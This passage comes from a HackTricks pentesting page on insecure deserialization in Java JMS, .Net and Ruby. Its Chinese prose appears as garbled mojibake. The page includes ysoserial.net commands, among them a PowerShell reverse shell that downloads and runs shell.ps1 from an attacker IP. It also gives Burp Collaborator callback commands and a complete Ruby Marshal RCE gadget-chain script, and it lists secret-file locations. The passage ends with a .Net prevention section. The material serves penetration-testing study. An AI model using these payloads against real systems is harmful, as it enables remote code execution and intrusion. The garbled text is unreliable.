![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../.gitbook/assets/image (292).png>)

### åˆ©ç”¨

å› æ­¤ï¼ŒåŸºæœ¬ä¸Šæœ‰**ä¸€å †æœåŠ¡ä»¥å±é™©çš„æ–¹å¼ä½¿ç”¨ JMS**ã€‚å› æ­¤ï¼Œå¦‚æœæ‚¨æœ‰**è¶³å¤Ÿçš„æƒé™**å‘è¿™äº›æœåŠ¡å‘é€æ¶ˆæ¯ï¼ˆé€šå¸¸éœ€è¦æœ‰æ•ˆå‡­æ®ï¼‰ï¼Œæ‚¨å¯èƒ½èƒ½å¤Ÿå‘é€**åºåˆ—åŒ–çš„æ¶æ„å¯¹è±¡ï¼Œå°†ç”±æ¶ˆè´¹è€…/è®¢é˜…è€…è¿›è¡Œååºåˆ—åŒ–**ã€‚\
è¿™æ„å‘³ç€åœ¨æ­¤åˆ©ç”¨ä¸­ï¼Œæ‰€æœ‰**å°†ä½¿ç”¨è¯¥æ¶ˆæ¯çš„å®¢æˆ·ç«¯éƒ½å°†å—åˆ°æ„ŸæŸ“**ã€‚

è¯·è®°ä½ï¼Œå³ä½¿æœåŠ¡å­˜åœ¨æ¼æ´ï¼ˆå› ä¸ºå®ƒä¸å®‰å…¨åœ°ååºåˆ—åŒ–ç”¨æˆ·è¾“å…¥ï¼‰ï¼Œæ‚¨ä»ç„¶éœ€è¦æ‰¾åˆ°æœ‰æ•ˆçš„å·¥å…·æ¥åˆ©ç”¨æ¼æ´ã€‚

å·¥å…·[JMET](https://github.com/matthiaskaiser/jmet) æ˜¯ä¸ºäº†**è¿æ¥å’Œæ”»å‡»è¿™äº›æœåŠ¡ï¼Œå‘é€ä½¿ç”¨å·²çŸ¥å·¥å…·ç”Ÿæˆçš„å¤šä¸ªåºåˆ—åŒ–çš„æ¶æ„å¯¹è±¡**è€Œåˆ›å»ºçš„ã€‚å¦‚æœæœåŠ¡ä»ç„¶å­˜åœ¨æ¼æ´ï¼Œå¹¶ä¸”ä½¿ç”¨çš„å·¥å…·ä¸­åŒ…å«ä»»ä½•å·²ä½¿ç”¨çš„å·¥å…·ï¼Œåˆ™è¿™äº›åˆ©ç”¨å°†èµ·ä½œç”¨ã€‚

### å‚è€ƒèµ„æ–™

* JMET è®²è§£ï¼š[https://www.youtube.com/watch?v=0h8DWiOWGGA](https://www.youtube.com/watch?v=0h8DWiOWGGA)
* å¹»ç¯ç‰‡ï¼š[https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf)

## .Net

åœ¨ .Net çš„èƒŒæ™¯ä¸‹ï¼Œååºåˆ—åŒ–åˆ©ç”¨çš„æ“ä½œæ–¹å¼ç±»ä¼¼äº Java ä¸­å‘ç°çš„æ–¹å¼ï¼Œå…¶ä¸­åˆ©ç”¨å·¥å…·è¿è¡Œç‰¹å®šä»£ç ä»¥åœ¨å¯¹è±¡çš„ååºåˆ—åŒ–æœŸé—´æ‰§è¡Œã€‚

### æŒ‡çº¹

#### ç™½ç›’

åº”æ£€æŸ¥æºä»£ç ä¸­æ˜¯å¦å­˜åœ¨ä»¥ä¸‹å†…å®¹ï¼š

1. `TypeNameHandling`
2. `JavaScriptTypeResolver`

é‡ç‚¹åº”æ”¾åœ¨å…è®¸ç±»å‹ç”±ç”¨æˆ·æ§åˆ¶çš„å˜é‡ç¡®å®šçš„åºåˆ—åŒ–ç¨‹åºä¸Šã€‚

#### é»‘ç›’

æœç´¢åº”é’ˆå¯¹ Base64 ç¼–ç çš„å­—ç¬¦ä¸² **AAEAAAD/////** æˆ–å¯èƒ½åœ¨æœåŠ¡å™¨ç«¯è¿›è¡Œååºåˆ—åŒ–çš„ä»»ä½•ç±»ä¼¼æ¨¡å¼ï¼Œä»è€Œæˆäºˆå¯¹è¦ååºåˆ—åŒ–çš„ç±»å‹çš„æ§åˆ¶æƒã€‚è¿™å¯èƒ½åŒ…æ‹¬ä½†ä¸é™äºåŒ…å« `TypeObject` æˆ– `$type` çš„ **JSON** æˆ– **XML** ç»“æ„ã€‚

### ysoserial.net

åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨å·¥å…· [**ysoserial.net**](https://github.com/pwntester/ysoserial.net) æ¥**åˆ›å»ºååºåˆ—åŒ–åˆ©ç”¨**ã€‚ä¸€æ—¦ä¸‹è½½äº† git å­˜å‚¨åº“ï¼Œæ‚¨åº”è¯¥ä½¿ç”¨ä¾‹å¦‚ Visual Studio ç¼–è¯‘å·¥å…·ã€‚

å¦‚æœæ‚¨æƒ³äº†è§£ **ysoserial.net å¦‚ä½•åˆ›å»ºå…¶åˆ©ç”¨**ï¼Œæ‚¨å¯ä»¥[**æŸ¥çœ‹æ­¤é¡µé¢ï¼Œå…¶ä¸­è§£é‡Šäº† ObjectDataProvider gadget + ExpandedWrapper + Json.Net formatter**](basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md)ã€‚

**ysoserial.net** çš„ä¸»è¦é€‰é¡¹åŒ…æ‹¬ï¼š**`--gadget`**ã€**`--formatter`**ã€**`--output`** å’Œ **`--plugin`**ã€‚

* **`--gadget`** ç”¨äºæŒ‡ç¤ºè¦æ»¥ç”¨çš„ gadgetï¼ˆæŒ‡ç¤ºåœ¨ååºåˆ—åŒ–æœŸé—´å°†è¢«æ»¥ç”¨ä»¥æ‰§è¡Œå‘½ä»¤çš„ç±»/å‡½æ•°ï¼‰ã€‚
* **`--formatter`** ç”¨äºæŒ‡ç¤ºåºåˆ—åŒ–åˆ©ç”¨çš„æ–¹æ³•ï¼ˆæ‚¨éœ€è¦çŸ¥é“åç«¯ä½¿ç”¨çš„åº“ä»¥ååºåˆ—åŒ–æœ‰æ•ˆè´Ÿè½½å¹¶ä½¿ç”¨ç›¸åŒçš„åº“è¿›è¡Œåºåˆ—åŒ–ï¼‰ã€‚
* **`--output`** ç”¨äºæŒ‡ç¤ºæ˜¯å¦å¸Œæœ›ä»¥ **åŸå§‹** æˆ– **Base64** ç¼–ç å½¢å¼è·å¾—åˆ©ç”¨ã€‚_è¯·æ³¨æ„ï¼Œ**ysoserial.net** å°†ä½¿ç”¨ **UTF-16LE**ï¼ˆWindows é»˜è®¤ä½¿ç”¨çš„ç¼–ç ï¼‰å¯¹æœ‰æ•ˆè´Ÿè½½è¿›è¡Œ**ç¼–ç **ï¼Œå› æ­¤å¦‚æœè·å–åŸå§‹æœ‰æ•ˆè´Ÿè½½å¹¶ä»…ä» Linux æ§åˆ¶å°å¯¹å…¶è¿›è¡Œç¼–ç ï¼Œå¯èƒ½ä¼šå‡ºç°ä¸€äº›**ç¼–ç å…¼å®¹æ€§é—®é¢˜**ï¼Œè¿™å°†é˜»æ­¢åˆ©ç”¨æ­£å¸¸å·¥ä½œï¼ˆåœ¨ HTB JSON ç›’ä¸­ï¼Œæœ‰æ•ˆè´Ÿè½½åœ¨ UTF-16LE å’Œ ASCII ä¸­éƒ½æœ‰æ•ˆï¼Œä½†è¿™å¹¶ä¸æ„å‘³ç€å®ƒæ€»æ˜¯æœ‰æ•ˆï¼‰ã€‚
* **`--plugin`** ysoserial.net æ”¯æŒæ’ä»¶ï¼Œç”¨äºä¸ºç‰¹å®šæ¡†æ¶**åˆ›å»ºåˆ©ç”¨**ï¼Œå¦‚ ViewState

#### æ›´å¤š ysoserial.net å‚æ•°

* `--minify` å°†æä¾›ä¸€ä¸ª**æ›´å°çš„æœ‰æ•ˆè´Ÿè½½**ï¼ˆå¦‚æœå¯èƒ½ï¼‰
* `--raf -f Json.Net -c "anything"` è¿™å°†æŒ‡ç¤ºå¯ä»¥ä¸æä¾›çš„æ ¼å¼åŒ–ç¨‹åºï¼ˆåœ¨æœ¬ä¾‹ä¸­ä¸º `Json.Net`ï¼‰ä¸€èµ·ä½¿ç”¨çš„æ‰€æœ‰å·¥å…·
* `--sf xml` æ‚¨å¯ä»¥**æŒ‡ç¤ºä¸€ä¸ª gadget**ï¼ˆ-gï¼‰å¹¶ä¸” ysoserial.net å°†æœç´¢åŒ…å« "xml" çš„æ ¼å¼åŒ–ç¨‹åºï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰

**ysoserial ç¤ºä¾‹**ä»¥åˆ›å»ºåˆ©ç”¨ï¼š
```bash
#Send ping
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "ping -n 5 10.10.14.44" -o base64

#Timing
#I tried using ping and timeout but there wasn't any difference in the response timing from the web server

#DNS/HTTP request
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "nslookup sb7jkgm6onw1ymw0867mzm2r0i68ux.burpcollaborator.net" -o base64
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "certutil -urlcache -split -f http://rfaqfsze4tl7hhkt5jtp53a1fsli97.burpcollaborator.net/a a" -o base64

#Reverse shell
#Create shell command in linux
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.44/shell.ps1')" | iconv  -t UTF-16LE | base64 -w0
#Create exploit using the created B64 shellcode
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADQANAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=" -o base64
```
**ysoserial.net** è¿˜æœ‰ä¸€ä¸ªéå¸¸æœ‰è¶£çš„å‚æ•°ï¼Œæœ‰åŠ©äºæ›´å¥½åœ°ç†è§£æ¯ä¸ªæ¼æ´åˆ©ç”¨æ–¹å¼ï¼š`--test`ã€‚å¦‚æœæ‚¨æŒ‡å®šäº†è¿™ä¸ªå‚æ•°ï¼Œ**ysoserial.net** å°†åœ¨æœ¬åœ°å°è¯•è¯¥æ¼æ´åˆ©ç”¨ï¼Œè¿™æ ·æ‚¨å°±å¯ä»¥æµ‹è¯•æ‚¨çš„æœ‰æ•ˆè´Ÿè½½æ˜¯å¦èƒ½æ­£å¸¸å·¥ä½œã€‚è¿™ä¸ªå‚æ•°å¾ˆæœ‰å¸®åŠ©ï¼Œå› ä¸ºå¦‚æœæ‚¨æŸ¥çœ‹ä»£ç ï¼Œæ‚¨ä¼šå‘ç°ç±»ä¼¼ä»¥ä¸‹ä»£ç å—çš„ä»£ç ï¼ˆæ¥è‡ª[ObjectDataProviderGenerator.cs](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Generators/ObjectDataProviderGenerator.cs#L208)ï¼‰ï¼š
```java
if (inputArgs.Test)
{
try
{
SerializersHelper.JsonNet_deserialize(payload);
}
catch (Exception err)
{
Debugging.ShowErrors(inputArgs, err);
}
}
```
è¿™æ„å‘³ç€ä¸ºäº†æµ‹è¯•æ¼æ´åˆ©ç”¨ä»£ç å°†è°ƒç”¨[serializersHelper.JsonNet\_deserialize](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Helpers/SerializersHelper.cs#L539)ã€‚
```java
public static object JsonNet_deserialize(string str)
{
Object obj = JsonConvert.DeserializeObject<Object>(str, new JsonSerializerSettings
{
TypeNameHandling = TypeNameHandling.Auto
});
return obj;
}
```
åœ¨**å…ˆå‰çš„ä»£ç ä¸­å­˜åœ¨æ¼æ´**ã€‚å› æ­¤ï¼Œå¦‚æœåœ¨ä¸€ä¸ª .Net åº”ç”¨ç¨‹åºä¸­å‘ç°ç±»ä¼¼çš„æƒ…å†µï¼Œé‚£ä¹ˆè¯¥åº”ç”¨ç¨‹åºå¾ˆå¯èƒ½ä¹Ÿå­˜åœ¨æ¼æ´ã€‚\
å› æ­¤ï¼Œ**`--test`** å‚æ•°å…è®¸æˆ‘ä»¬äº†è§£**å“ªäº›ä»£ç å—å®¹æ˜“å—åˆ° ysoserial.net åˆ›å»ºçš„ååºåˆ—åŒ–æ¼æ´**çš„å½±å“ã€‚

### ViewState

æŸ¥çœ‹å…³äº[**å¦‚ä½•å°è¯•åˆ©ç”¨ .Net çš„ \_\_ViewState å‚æ•°æ¥æ‰§è¡Œä»»æ„ä»£ç **](exploiting-\_\_viewstate-parameter.md)çš„**è¿™ç¯‡æ–‡ç« **ã€‚å¦‚æœæ‚¨**å·²ç»çŸ¥é“**å—å®³è€…æœºå™¨ä½¿ç”¨çš„**ç§˜å¯†**ï¼Œè¯·é˜…è¯»[**æ­¤æ–‡ç« ä»¥äº†è§£å¦‚ä½•æ‰§è¡Œä»£ç **](exploiting-\_\_viewstate-knowing-the-secret.md)**ã€‚**

### é¢„é˜²æªæ–½

ä¸ºäº†å‡è½» .Net ä¸­ååºåˆ—åŒ–å¸¦æ¥çš„é£é™©ï¼š

- **é¿å…å…è®¸æ•°æ®æµå®šä¹‰å…¶å¯¹è±¡ç±»å‹**ã€‚å°½å¯èƒ½ä½¿ç”¨ `DataContractSerializer` æˆ– `XmlSerializer`ã€‚

- **å¯¹äº `JSON.Net`ï¼Œå°† `TypeNameHandling` è®¾ç½®ä¸º `None`ï¼š**
%%%TypeNameHandling = TypeNameHandling.None%%%

- **é¿å…ä½¿ç”¨å¸¦æœ‰ `JavaScriptTypeResolver` çš„ `JavaScriptSerializer`ã€‚**

- **é™åˆ¶å¯ä»¥ååºåˆ—åŒ–çš„ç±»å‹**ï¼Œäº†è§£ .Net ç±»å‹çš„å›ºæœ‰é£é™©ï¼Œä¾‹å¦‚ `System.IO.FileInfo` å¯ä»¥ä¿®æ”¹æœåŠ¡å™¨æ–‡ä»¶çš„å±æ€§ï¼Œå¯èƒ½å¯¼è‡´æ‹’ç»æœåŠ¡æ”»å‡»ã€‚

- **è°¨æ…å¤„ç†å…·æœ‰é£é™©å±æ€§çš„ç±»å‹**ï¼Œä¾‹å¦‚ `System.ComponentModel.DataAnnotations.ValidationException` çš„ `Value` å±æ€§å¯èƒ½ä¼šè¢«åˆ©ç”¨ã€‚

- **å®‰å…¨åœ°æ§åˆ¶ç±»å‹å®ä¾‹åŒ–**ï¼Œä»¥é˜²æ­¢æ”»å‡»è€…å½±å“ååºåˆ—åŒ–è¿‡ç¨‹ï¼Œå³ä½¿æ˜¯ `DataContractSerializer` æˆ– `XmlSerializer` ä¹Ÿä¼šæœ‰æ¼æ´ã€‚

- **ä½¿ç”¨è‡ªå®šä¹‰ `SerializationBinder` ä¸º `BinaryFormatter` å’Œ `JSON.Net` å®ç°ç™½åå•æ§åˆ¶**ã€‚

- **äº†è§£ .Net ä¸­å·²çŸ¥çš„ä¸å®‰å…¨ååºåˆ—åŒ–å°å·¥å…·**ï¼Œç¡®ä¿ååºåˆ—åŒ–å™¨ä¸ä¼šå®ä¾‹åŒ–æ­¤ç±»ç±»å‹ã€‚

- **å°†æ½œåœ¨é£é™©ä»£ç ä¸å…·æœ‰äº’è”ç½‘è®¿é—®æƒé™çš„ä»£ç éš”ç¦»**ï¼Œä»¥é¿å…å°†å·²çŸ¥å°å·¥å…·ï¼ˆä¾‹å¦‚ WPF åº”ç”¨ç¨‹åºä¸­çš„ `System.Windows.Data.ObjectDataProvider`ï¼‰æš´éœ²ç»™ä¸å—ä¿¡ä»»çš„æ•°æ®æºã€‚

### **å‚è€ƒèµ„æ–™**

* Java å’Œ .Net JSON ååºåˆ—åŒ–**è®ºæ–‡ï¼š**[**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**ï¼Œ**æ¼”è®²ï¼š[https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c)**ï¼Œ**å¹»ç¯ç‰‡ï¼š[https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
* [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html#net-csharp](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html#net-csharp)
* [https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH\_US\_12\_Forshaw\_Are\_You\_My\_Type\_WP.pdf](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH\_US\_12\_Forshaw\_Are\_You\_My\_Type\_WP.pdf)
* [https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization](https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization)

## **Ruby**

åœ¨ Ruby ä¸­ï¼Œåºåˆ—åŒ–ç”± **marshal** åº“ä¸­çš„ä¸¤ç§æ–¹æ³•å®ç°ã€‚ç¬¬ä¸€ç§æ–¹æ³•ç§°ä¸º **dump**ï¼Œç”¨äºå°†å¯¹è±¡è½¬æ¢ä¸ºå­—èŠ‚æµã€‚è¿™ä¸ªè¿‡ç¨‹ç§°ä¸ºåºåˆ—åŒ–ã€‚ç›¸åï¼Œç¬¬äºŒç§æ–¹æ³• **load** ç”¨äºå°†å­—èŠ‚æµæ¢å¤ä¸ºå¯¹è±¡ï¼Œè¿™ä¸ªè¿‡ç¨‹ç§°ä¸ºååºåˆ—åŒ–ã€‚

ä¸ºäº†ä¿æŠ¤åºåˆ—åŒ–å¯¹è±¡ï¼Œ**Ruby ä½¿ç”¨ HMACï¼ˆåŸºäºå“ˆå¸Œçš„æ¶ˆæ¯è®¤è¯ç ï¼‰**ï¼Œç¡®ä¿æ•°æ®çš„å®Œæ•´æ€§å’ŒçœŸå®æ€§ã€‚ç”¨äºæ­¤ç›®çš„çš„å¯†é’¥å­˜å‚¨åœ¨ä»¥ä¸‹å‡ ä¸ªå¯èƒ½çš„ä½ç½®ä¹‹ä¸€ï¼š

- `config/environment.rb`
- `config/initializers/secret_token.rb`
- `config/secrets.yml`
- `/proc/self/environ`

**Ruby 2.X é€šç”¨ååºåˆ—åŒ–åˆ° RCE å°å·¥å…·é“¾ï¼ˆæ›´å¤šä¿¡æ¯è¯·å‚é˜… [https://www.elttam.com/blog/ruby-deserialization/](https://www.elttam.com/blog/ruby-deserialization/)ï¼‰**ï¼š
```ruby
#!/usr/bin/env ruby

# Code from https://www.elttam.com/blog/ruby-deserialization/

class Gem::StubSpecification
def initialize; end
end


stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, "|id 1>&2")#RCE cmd must start with "|" and end with "1>&2"

puts "STEP n"
stub_specification.name rescue nil
puts


class Gem::Source::SpecificFile
def initialize; end
end

specific_file = Gem::Source::SpecificFile.new
specific_file.instance_variable_set(:@spec, stub_specification)

other_specific_file = Gem::Source::SpecificFile.new

puts "STEP n-1"
specific_file <=> other_specific_file rescue nil
puts


$dependency_list= Gem::DependencyList.new
$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

puts "STEP n-2"
$dependency_list.each{} rescue nil
puts


class Gem::Requirement
def marshal_dump
[$dependency_list]
end
end

payload = Marshal.dump(Gem::Requirement.new)

puts "STEP n-3"
Marshal.load(payload) rescue nil
puts


puts "VALIDATION (in fresh ruby process):"
IO.popen("ruby -e 'Marshal.load(STDIN.read) rescue nil'", "r+") do |pipe|
pipe.print payload
pipe.close_write
puts pipe.gets
puts
end

puts "Payload (hex):"
puts payload.unpack('H*')[0]
puts


require "base64"
puts "Payload (Base64 encoded):"
puts Base64.encode64(payload)
```
å¦ä¸€ä¸ªåˆ©ç”¨Ruby On Railsçš„RCEé“¾ï¼š[https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/](https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/)

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘ä»¬çš„**Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
